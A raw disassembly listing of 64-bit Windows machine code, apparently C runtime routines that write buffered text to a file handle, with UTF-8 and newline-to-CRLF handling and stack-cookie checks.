   14000a2fb:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000a2fe:	75 0d                	jne    0x14000a30d
   14000a300:	e8 8b b6 ff ff       	call   0x140005990
   14000a305:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a30b:	eb 6c                	jmp    0x14000a379
   14000a30d:	85 c9                	test   %ecx,%ecx
   14000a30f:	78 58                	js     0x14000a369
   14000a311:	3b 15 b9 e8 00 00    	cmp    0xe8b9(%rip),%edx        # 0x140018bd0
   14000a317:	73 50                	jae    0x14000a369
   14000a319:	48 8b ca             	mov    %rdx,%rcx
   14000a31c:	4c 8d 05 ad e4 00 00 	lea    0xe4ad(%rip),%r8        # 0x1400187d0
   14000a323:	83 e1 3f             	and    $0x3f,%ecx
   14000a326:	48 8b c2             	mov    %rdx,%rax
   14000a329:	48 c1 f8 06          	sar    $0x6,%rax
   14000a32d:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000a331:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a335:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000a33a:	74 2d                	je     0x14000a369
   14000a33c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a341:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000a345:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000a349:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000a34e:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000a353:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a358:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a35d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a362:	e8 fd fe ff ff       	call   0x14000a264
   14000a367:	eb 13                	jmp    0x14000a37c
   14000a369:	e8 22 b6 ff ff       	call   0x140005990
   14000a36e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a374:	e8 f7 b4 ff ff       	call   0x140005870
   14000a379:	83 c8 ff             	or     $0xffffffff,%eax
   14000a37c:	48 83 c4 38          	add    $0x38,%rsp
   14000a380:	c3                   	ret
   14000a381:	cc                   	int3
   14000a382:	cc                   	int3
   14000a383:	cc                   	int3
   14000a384:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a389:	55                   	push   %rbp
   14000a38a:	56                   	push   %rsi
   14000a38b:	57                   	push   %rdi
   14000a38c:	41 54                	push   %r12
   14000a38e:	41 55                	push   %r13
   14000a390:	41 56                	push   %r14
   14000a392:	41 57                	push   %r15
   14000a394:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   14000a399:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   14000a3a0:	48 8b 05 59 cc 00 00 	mov    0xcc59(%rip),%rax        # 0x140017000
   14000a3a7:	48 33 c4             	xor    %rsp,%rax
   14000a3aa:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000a3ae:	48 63 f2             	movslq %edx,%rsi
   14000a3b1:	4d 8b f8             	mov    %r8,%r15
   14000a3b4:	48 8b c6             	mov    %rsi,%rax
   14000a3b7:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   14000a3bb:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000a3bf:	48 8d 0d 3a 5c ff ff 	lea    -0xa3c6(%rip),%rcx        # 0x140000000
   14000a3c6:	83 e0 3f             	and    $0x3f,%eax
   14000a3c9:	45 8b e9             	mov    %r9d,%r13d
   14000a3cc:	4d 03 e8             	add    %r8,%r13
   14000a3cf:	4c 89 45 df          	mov    %r8,-0x21(%rbp)
   14000a3d3:	4c 8b e6             	mov    %rsi,%r12
   14000a3d6:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   14000a3da:	49 c1 fc 06          	sar    $0x6,%r12
   14000a3de:	4c 8d 34 c0          	lea    (%rax,%rax,8),%r14
   14000a3e2:	4a 8b 84 e1 d0 87 01 	mov    0x187d0(%rcx,%r12,8),%rax
   14000a3e9:	00 
   14000a3ea:	4a 8b 44 f0 28       	mov    0x28(%rax,%r14,8),%rax
   14000a3ef:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   14000a3f3:	ff 15 b7 2c 00 00    	call   *0x2cb7(%rip)        # 0x14000d0b0
   14000a3f9:	33 d2                	xor    %edx,%edx
   14000a3fb:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a400:	89 45 a7             	mov    %eax,-0x59(%rbp)
   14000a403:	e8 38 96 ff ff       	call   0x140003a40
   14000a408:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000a40d:	45 33 db             	xor    %r11d,%r11d
   14000a410:	44 89 5d 97          	mov    %r11d,-0x69(%rbp)
   14000a414:	41 8b db             	mov    %r11d,%ebx
   14000a417:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000a41a:	49 8b ff             	mov    %r15,%rdi
   14000a41d:	8b 51 0c             	mov    0xc(%rcx),%edx
   14000a420:	41 8b cb             	mov    %r11d,%ecx
   14000a423:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   14000a427:	89 55 ab             	mov    %edx,-0x55(%rbp)
   14000a42a:	4d 3b fd             	cmp    %r13,%r15
   14000a42d:	0f 83 e2 03 00 00    	jae    0x14000a815
   14000a433:	48 8b c6             	mov    %rsi,%rax
   14000a436:	49 8b f7             	mov    %r15,%rsi
   14000a439:	48 c1 f8 06          	sar    $0x6,%rax
   14000a43d:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000a441:	8a 0f                	mov    (%rdi),%cl
   14000a443:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   14000a449:	88 4c 24 44          	mov    %cl,0x44(%rsp)
   14000a44d:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   14000a452:	81 fa e9 fd 00 00    	cmp    $0xfde9,%edx
   14000a458:	0f 85 70 01 00 00    	jne    0x14000a5ce
   14000a45e:	4c 8d 3d 9b 5b ff ff 	lea    -0xa465(%rip),%r15        # 0x140000000
   14000a465:	41 8b d3             	mov    %r11d,%edx
   14000a468:	4d 8b 8c c7 d0 87 01 	mov    0x187d0(%r15,%rax,8),%r9
   14000a46f:	00 
   14000a470:	49 8b f3             	mov    %r11,%rsi
   14000a473:	4b 8d 04 f1          	lea    (%r9,%r14,8),%rax
   14000a477:	44 38 5c 30 3e       	cmp    %r11b,0x3e(%rax,%rsi,1)
   14000a47c:	74 0b                	je     0x14000a489
   14000a47e:	ff c2                	inc    %edx
   14000a480:	48 ff c6             	inc    %rsi
   14000a483:	48 83 fe 05          	cmp    $0x5,%rsi
   14000a487:	7c ee                	jl     0x14000a477
   14000a489:	48 85 f6             	test   %rsi,%rsi
   14000a48c:	0f 8e e0 00 00 00    	jle    0x14000a572
   14000a492:	4b 8b 84 e7 d0 87 01 	mov    0x187d0(%r15,%r12,8),%rax
   14000a499:	00 
   14000a49a:	4c 8b 45 af          	mov    -0x51(%rbp),%r8
   14000a49e:	4c 2b c7             	sub    %rdi,%r8
   14000a4a1:	42 0f b6 4c f0 3e    	movzbl 0x3e(%rax,%r14,8),%ecx
   14000a4a7:	46 0f be bc 39 d0 78 	movsbl 0x178d0(%rcx,%r15,1),%r15d
   14000a4ae:	01 00 
   14000a4b0:	41 ff c7             	inc    %r15d
   14000a4b3:	45 8b ef             	mov    %r15d,%r13d
   14000a4b6:	44 2b ea             	sub    %edx,%r13d
   14000a4b9:	4d 63 d5             	movslq %r13d,%r10
   14000a4bc:	4d 3b d0             	cmp    %r8,%r10
   14000a4bf:	0f 8f 78 02 00 00    	jg     0x14000a73d
   14000a4c5:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000a4c9:	49 8b d3             	mov    %r11,%rdx
   14000a4cc:	4c 2b c8             	sub    %rax,%r9
   14000a4cf:	4f 8d 04 f1          	lea    (%r9,%r14,8),%r8
   14000a4d3:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000a4d7:	48 03 ca             	add    %rdx,%rcx
   14000a4da:	48 ff c2             	inc    %rdx
   14000a4dd:	42 8a 44 01 3e       	mov    0x3e(%rcx,%r8,1),%al
   14000a4e2:	88 01                	mov    %al,(%rcx)
   14000a4e4:	48 3b d6             	cmp    %rsi,%rdx
   14000a4e7:	7c ea                	jl     0x14000a4d3
   14000a4e9:	45 85 ed             	test   %r13d,%r13d
   14000a4ec:	7e 15                	jle    0x14000a503
   14000a4ee:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000a4f2:	4d 8b c2             	mov    %r10,%r8
   14000a4f5:	48 03 ce             	add    %rsi,%rcx
   14000a4f8:	48 8b d7             	mov    %rdi,%rdx
   14000a4fb:	e8 30 8d ff ff       	call   0x140003230
   14000a500:	45 33 db             	xor    %r11d,%r11d
   14000a503:	49 8b d3             	mov    %r11,%rdx
   14000a506:	4c 8d 05 f3 5a ff ff 	lea    -0xa50d(%rip),%r8        # 0x140000000
   14000a50d:	4b 8b 8c e0 d0 87 01 	mov    0x187d0(%r8,%r12,8),%rcx
   14000a514:	00 
   14000a515:	48 03 ca             	add    %rdx,%rcx
   14000a518:	48 ff c2             	inc    %rdx
   14000a51b:	46 88 5c f1 3e       	mov    %r11b,0x3e(%rcx,%r14,8)
   14000a520:	48 3b d6             	cmp    %rsi,%rdx
   14000a523:	7c e8                	jl     0x14000a50d
   14000a525:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000a529:	4c 89 5d bf          	mov    %r11,-0x41(%rbp)
   14000a52d:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   14000a531:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   14000a535:	41 8b c3             	mov    %r11d,%eax
   14000a538:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000a53c:	41 83 ff 04          	cmp    $0x4,%r15d
   14000a540:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a545:	0f 94 c0             	sete   %al
   14000a548:	ff c0                	inc    %eax
   14000a54a:	44 8b c0             	mov    %eax,%r8d
   14000a54d:	44 8b f8             	mov    %eax,%r15d
   14000a550:	e8 57 0c 00 00       	call   0x14000b1ac
   14000a555:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a559:	0f 84 d7 00 00 00    	je     0x14000a636
   14000a55f:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   14000a563:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   14000a567:	48 63 f0             	movslq %eax,%rsi
   14000a56a:	48 03 f7             	add    %rdi,%rsi
   14000a56d:	e9 e6 00 00 00       	jmp    0x14000a658
   14000a572:	0f b6 07             	movzbl (%rdi),%eax
   14000a575:	49 8b d5             	mov    %r13,%rdx
   14000a578:	48 2b d7             	sub    %rdi,%rdx
   14000a57b:	4a 0f be b4 38 d0 78 	movsbq 0x178d0(%rax,%r15,1),%rsi
   14000a582:	01 00 
   14000a584:	8d 4e 01             	lea    0x1(%rsi),%ecx
   14000a587:	48 63 c1             	movslq %ecx,%rax
   14000a58a:	48 3b c2             	cmp    %rdx,%rax
   14000a58d:	0f 8f e4 01 00 00    	jg     0x14000a777
   14000a593:	83 f9 04             	cmp    $0x4,%ecx
   14000a596:	4c 89 5d cf          	mov    %r11,-0x31(%rbp)
   14000a59a:	41 8b c3             	mov    %r11d,%eax
   14000a59d:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   14000a5a1:	0f 94 c0             	sete   %al
   14000a5a4:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   14000a5a8:	ff c0                	inc    %eax
   14000a5aa:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000a5ae:	44 8b c0             	mov    %eax,%r8d
   14000a5b1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a5b6:	8b d8                	mov    %eax,%ebx
   14000a5b8:	e8 ef 0b 00 00       	call   0x14000b1ac
   14000a5bd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a5c1:	74 73                	je     0x14000a636
   14000a5c3:	48 03 f7             	add    %rdi,%rsi
   14000a5c6:	44 8b fb             	mov    %ebx,%r15d
   14000a5c9:	e9 8a 00 00 00       	jmp    0x14000a658
   14000a5ce:	48 8d 05 2b 5a ff ff 	lea    -0xa5d5(%rip),%rax        # 0x140000000
   14000a5d5:	4a 8b 94 e0 d0 87 01 	mov    0x187d0(%rax,%r12,8),%rdx
   14000a5dc:	00 
   14000a5dd:	42 8a 4c f2 3d       	mov    0x3d(%rdx,%r14,8),%cl
   14000a5e2:	f6 c1 04             	test   $0x4,%cl
   14000a5e5:	74 1b                	je     0x14000a602
   14000a5e7:	42 8a 44 f2 3e       	mov    0x3e(%rdx,%r14,8),%al
   14000a5ec:	80 e1 fb             	and    $0xfb,%cl
   14000a5ef:	88 45 07             	mov    %al,0x7(%rbp)
   14000a5f2:	8a 07                	mov    (%rdi),%al
   14000a5f4:	42 88 4c f2 3d       	mov    %cl,0x3d(%rdx,%r14,8)
   14000a5f9:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000a5fd:	88 45 08             	mov    %al,0x8(%rbp)
   14000a600:	eb 1f                	jmp    0x14000a621
   14000a602:	e8 a9 b9 ff ff       	call   0x140005fb0
   14000a607:	0f b6 0f             	movzbl (%rdi),%ecx
   14000a60a:	33 d2                	xor    %edx,%edx
   14000a60c:	66 39 14 48          	cmp    %dx,(%rax,%rcx,2)
   14000a610:	7d 2d                	jge    0x14000a63f
   14000a612:	48 ff c6             	inc    %rsi
   14000a615:	49 3b f5             	cmp    %r13,%rsi
   14000a618:	0f 83 b2 01 00 00    	jae    0x14000a7d0
   14000a61e:	48 8b d7             	mov    %rdi,%rdx
   14000a621:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000a627:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a62c:	e8 43 ed ff ff       	call   0x140009374
   14000a631:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a634:	75 22                	jne    0x14000a658
   14000a636:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000a63a:	e9 8b 01 00 00       	jmp    0x14000a7ca
   14000a63f:	4d 8b c7             	mov    %r15,%r8
   14000a642:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a647:	48 8b d7             	mov    %rdi,%rdx
   14000a64a:	e8 25 ed ff ff       	call   0x140009374
   14000a64f:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a652:	0f 84 af 01 00 00    	je     0x14000a807
   14000a658:	8b 4d a7             	mov    -0x59(%rbp),%ecx
   14000a65b:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000a65f:	33 db                	xor    %ebx,%ebx
   14000a661:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000a666:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000a66b:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   14000a66f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000a674:	45 8b cf             	mov    %r15d,%r9d
   14000a677:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000a67e:	00 
   14000a67f:	33 d2                	xor    %edx,%edx
   14000a681:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a686:	e8 8d d2 ff ff       	call   0x140007918
   14000a68b:	8b f0                	mov    %eax,%esi
   14000a68d:	85 c0                	test   %eax,%eax
   14000a68f:	0f 84 d2 01 00 00    	je     0x14000a867
   14000a695:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000a699:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000a69e:	44 8b c0             	mov    %eax,%r8d
   14000a6a1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a6a6:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000a6aa:	ff 15 c8 29 00 00    	call   *0x29c8(%rip)        # 0x14000d078
   14000a6b0:	45 33 db             	xor    %r11d,%r11d
   14000a6b3:	85 c0                	test   %eax,%eax
   14000a6b5:	0f 84 a3 01 00 00    	je     0x14000a85e
   14000a6bb:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   14000a6c0:	8b df                	mov    %edi,%ebx
   14000a6c2:	2b 5d df             	sub    -0x21(%rbp),%ebx
   14000a6c5:	41 03 df             	add    %r15d,%ebx
   14000a6c8:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000a6cb:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   14000a6cf:	0f 82 f1 00 00 00    	jb     0x14000a7c6
   14000a6d5:	80 7c 24 44 0a       	cmpb   $0xa,0x44(%rsp)
   14000a6da:	75 49                	jne    0x14000a725
   14000a6dc:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   14000a6e0:	41 8d 43 0d          	lea    0xd(%r11),%eax
   14000a6e4:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000a6e9:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   14000a6ee:	45 8d 43 01          	lea    0x1(%r11),%r8d
   14000a6f2:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   14000a6f7:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   14000a6fc:	ff 15 76 29 00 00    	call   *0x2976(%rip)        # 0x14000d078
   14000a702:	45 33 db             	xor    %r11d,%r11d
   14000a705:	85 c0                	test   %eax,%eax
   14000a707:	0f 84 f1 00 00 00    	je     0x14000a7fe
   14000a70d:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   14000a712:	0f 82 ae 00 00 00    	jb     0x14000a7c6
   14000a718:	41 ff c7             	inc    %r15d
   14000a71b:	ff c3                	inc    %ebx
   14000a71d:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   14000a722:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000a725:	48 8b f7             	mov    %rdi,%rsi
   14000a728:	49 3b fd             	cmp    %r13,%rdi
   14000a72b:	0f 83 e0 00 00 00    	jae    0x14000a811
   14000a731:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   14000a735:	8b 55 ab             	mov    -0x55(%rbp),%edx
   14000a738:	e9 04 fd ff ff       	jmp    0x14000a441
   14000a73d:	41 8b d3             	mov    %r11d,%edx
   14000a740:	4d 85 c0             	test   %r8,%r8
   14000a743:	7e 2d                	jle    0x14000a772
   14000a745:	48 2b fe             	sub    %rsi,%rdi
   14000a748:	48 8d 1d b1 58 ff ff 	lea    -0xa74f(%rip),%rbx        # 0x140000000
   14000a74f:	8a 04 37             	mov    (%rdi,%rsi,1),%al
   14000a752:	ff c2                	inc    %edx
   14000a754:	4a 8b 8c e3 d0 87 01 	mov    0x187d0(%rbx,%r12,8),%rcx
   14000a75b:	00 
   14000a75c:	48 03 ce             	add    %rsi,%rcx
   14000a75f:	48 ff c6             	inc    %rsi
   14000a762:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000a767:	48 63 c2             	movslq %edx,%rax
   14000a76a:	49 3b c0             	cmp    %r8,%rax
   14000a76d:	7c e0                	jl     0x14000a74f
   14000a76f:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   14000a772:	41 03 d8             	add    %r8d,%ebx
   14000a775:	eb 4c                	jmp    0x14000a7c3
   14000a777:	45 8b cb             	mov    %r11d,%r9d
   14000a77a:	48 85 d2             	test   %rdx,%rdx
   14000a77d:	7e 42                	jle    0x14000a7c1
   14000a77f:	4c 8b 6d ef          	mov    -0x11(%rbp),%r13
   14000a783:	4d 8b c3             	mov    %r11,%r8
   14000a786:	4d 8b d5             	mov    %r13,%r10
   14000a789:	41 83 e5 3f          	and    $0x3f,%r13d
   14000a78d:	49 c1 fa 06          	sar    $0x6,%r10
   14000a791:	4e 8d 1c ed 00 00 00 	lea    0x0(,%r13,8),%r11
   14000a798:	00 
   14000a799:	4d 03 dd             	add    %r13,%r11
   14000a79c:	41 8a 04 38          	mov    (%r8,%rdi,1),%al
   14000a7a0:	41 ff c1             	inc    %r9d
   14000a7a3:	4b 8b 8c d7 d0 87 01 	mov    0x187d0(%r15,%r10,8),%rcx
   14000a7aa:	00 
   14000a7ab:	49 03 c8             	add    %r8,%rcx
   14000a7ae:	49 ff c0             	inc    %r8
   14000a7b1:	42 88 44 d9 3e       	mov    %al,0x3e(%rcx,%r11,8)
   14000a7b6:	49 63 c1             	movslq %r9d,%rax
   14000a7b9:	48 3b c2             	cmp    %rdx,%rax
   14000a7bc:	7c de                	jl     0x14000a79c
   14000a7be:	45 33 db             	xor    %r11d,%r11d
   14000a7c1:	03 da                	add    %edx,%ebx
   14000a7c3:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000a7c6:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000a7ca:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000a7ce:	eb 49                	jmp    0x14000a819
   14000a7d0:	8a 07                	mov    (%rdi),%al
   14000a7d2:	4c 8d 05 27 58 ff ff 	lea    -0xa7d9(%rip),%r8        # 0x140000000
   14000a7d9:	4b 8b 8c e0 d0 87 01 	mov    0x187d0(%r8,%r12,8),%rcx
   14000a7e0:	00 
   14000a7e1:	ff c3                	inc    %ebx
   14000a7e3:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000a7e6:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000a7eb:	4b 8b 84 e0 d0 87 01 	mov    0x187d0(%r8,%r12,8),%rax
   14000a7f2:	00 
   14000a7f3:	42 80 4c f0 3d 04    	orb    $0x4,0x3d(%rax,%r14,8)
   14000a7f9:	38 55 8f             	cmp    %dl,-0x71(%rbp)
   14000a7fc:	eb cc                	jmp    0x14000a7ca
   14000a7fe:	ff 15 14 28 00 00    	call   *0x2814(%rip)        # 0x14000d018
   14000a804:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000a807:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000a80b:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000a80f:	eb 08                	jmp    0x14000a819
   14000a811:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000a815:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000a819:	74 0c                	je     0x14000a827
   14000a81b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000a820:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a827:	48 8b 45 f7          	mov    -0x9(%rbp),%rax
   14000a82b:	f2 0f 10 45 97       	movsd  -0x69(%rbp),%xmm0
   14000a830:	f2 0f 11 00          	movsd  %xmm0,(%rax)
   14000a834:	89 48 08             	mov    %ecx,0x8(%rax)
   14000a837:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000a83b:	48 33 cc             	xor    %rsp,%rcx
   14000a83e:	e8 3d 6d ff ff       	call   0x140001580
   14000a843:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   14000a84a:	00 
   14000a84b:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   14000a852:	41 5f                	pop    %r15
   14000a854:	41 5e                	pop    %r14
   14000a856:	41 5d                	pop    %r13
   14000a858:	41 5c                	pop    %r12
   14000a85a:	5f                   	pop    %rdi
   14000a85b:	5e                   	pop    %rsi
   14000a85c:	5d                   	pop    %rbp
   14000a85d:	c3                   	ret
   14000a85e:	ff 15 b4 27 00 00    	call   *0x27b4(%rip)        # 0x14000d018
   14000a864:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000a867:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000a86b:	38 5d 8f             	cmp    %bl,-0x71(%rbp)
   14000a86e:	eb a9                	jmp    0x14000a819
   14000a870:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a875:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000a87a:	56                   	push   %rsi
   14000a87b:	57                   	push   %rdi
   14000a87c:	41 56                	push   %r14
   14000a87e:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000a883:	e8 a8 20 00 00       	call   0x14000c930
   14000a888:	48 2b e0             	sub    %rax,%rsp
   14000a88b:	48 8b 05 6e c7 00 00 	mov    0xc76e(%rip),%rax        # 0x140017000
   14000a892:	48 33 c4             	xor    %rsp,%rax
   14000a895:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000a89c:	00 
   14000a89d:	4c 63 d2             	movslq %edx,%r10
   14000a8a0:	48 8b f9             	mov    %rcx,%rdi
   14000a8a3:	49 8b c2             	mov    %r10,%rax
   14000a8a6:	41 8b e9             	mov    %r9d,%ebp
   14000a8a9:	48 c1 f8 06          	sar    $0x6,%rax
   14000a8ad:	48 8d 0d 1c df 00 00 	lea    0xdf1c(%rip),%rcx        # 0x1400187d0
   14000a8b4:	41 83 e2 3f          	and    $0x3f,%r10d
   14000a8b8:	49 03 e8             	add    %r8,%rbp
   14000a8bb:	49 8b f0             	mov    %r8,%rsi
   14000a8be:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000a8c2:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000a8c6:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000a8cb:	33 c0                	xor    %eax,%eax
   14000a8cd:	48 89 07             	mov    %rax,(%rdi)
   14000a8d0:	89 47 08             	mov    %eax,0x8(%rdi)
   14000a8d3:	4c 3b c5             	cmp    %rbp,%r8
   14000a8d6:	73 6f                	jae    0x14000a947
   14000a8d8:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000a8dd:	48 3b f5             	cmp    %rbp,%rsi
   14000a8e0:	73 24                	jae    0x14000a906
   14000a8e2:	8a 06                	mov    (%rsi),%al
   14000a8e4:	48 ff c6             	inc    %rsi
   14000a8e7:	3c 0a                	cmp    $0xa,%al
   14000a8e9:	75 09                	jne    0x14000a8f4
   14000a8eb:	ff 47 08             	incl   0x8(%rdi)
   14000a8ee:	c6 03 0d             	movb   $0xd,(%rbx)
   14000a8f1:	48 ff c3             	inc    %rbx
   14000a8f4:	88 03                	mov    %al,(%rbx)
   14000a8f6:	48 ff c3             	inc    %rbx
   14000a8f9:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000a900:	00 
   14000a901:	48 3b d8             	cmp    %rax,%rbx
   14000a904:	72 d7                	jb     0x14000a8dd
   14000a906:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a90c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a911:	2b d8                	sub    %eax,%ebx
   14000a913:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000a918:	44 8b c3             	mov    %ebx,%r8d
   14000a91b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000a920:	49 8b ce             	mov    %r14,%rcx
   14000a923:	ff 15 4f 27 00 00    	call   *0x274f(%rip)        # 0x14000d078
   14000a929:	85 c0                	test   %eax,%eax
   14000a92b:	74 12                	je     0x14000a93f
   14000a92d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000a931:	01 47 04             	add    %eax,0x4(%rdi)
   14000a934:	3b c3                	cmp    %ebx,%eax
   14000a936:	72 0f                	jb     0x14000a947
   14000a938:	48 3b f5             	cmp    %rbp,%rsi
   14000a93b:	72 9b                	jb     0x14000a8d8
   14000a93d:	eb 08                	jmp    0x14000a947
   14000a93f:	ff 15 d3 26 00 00    	call   *0x26d3(%rip)        # 0x14000d018
   14000a945:	89 07                	mov    %eax,(%rdi)
   14000a947:	48 8b c7             	mov    %rdi,%rax
   14000a94a:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000a951:	00 
   14000a952:	48 33 cc             	xor    %rsp,%rcx
   14000a955:	e8 26 6c ff ff       	call   0x140001580
   14000a95a:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000a961:	00 
   14000a962:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000a966:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000a96a:	49 8b e3             	mov    %r11,%rsp
   14000a96d:	41 5e                	pop    %r14
   14000a96f:	5f                   	pop    %rdi
   14000a970:	5e                   	pop    %rsi
   14000a971:	c3                   	ret
   14000a972:	cc                   	int3
   14000a973:	cc                   	int3
   14000a974:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a979:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000a97e:	56                   	push   %rsi
   14000a97f:	57                   	push   %rdi
   14000a980:	41 56                	push   %r14
   14000a982:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000a987:	e8 a4 1f 00 00       	call   0x14000c930
   14000a98c:	48 2b e0             	sub    %rax,%rsp
   14000a98f:	48 8b 05 6a c6 00 00 	mov    0xc66a(%rip),%rax        # 0x140017000
   14000a996:	48 33 c4             	xor    %rsp,%rax
   14000a999:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000a9a0:	00 
   14000a9a1:	4c 63 d2             	movslq %edx,%r10
   14000a9a4:	48 8b f9             	mov    %rcx,%rdi
   14000a9a7:	49 8b c2             	mov    %r10,%rax
   14000a9aa:	41 8b e9             	mov    %r9d,%ebp
   14000a9ad:	48 c1 f8 06          	sar    $0x6,%rax
   14000a9b1:	48 8d 0d 18 de 00 00 	lea    0xde18(%rip),%rcx        # 0x1400187d0
   14000a9b8:	41 83 e2 3f          	and    $0x3f,%r10d
   14000a9bc:	49 03 e8             	add    %r8,%rbp
   14000a9bf:	49 8b f0             	mov    %r8,%rsi
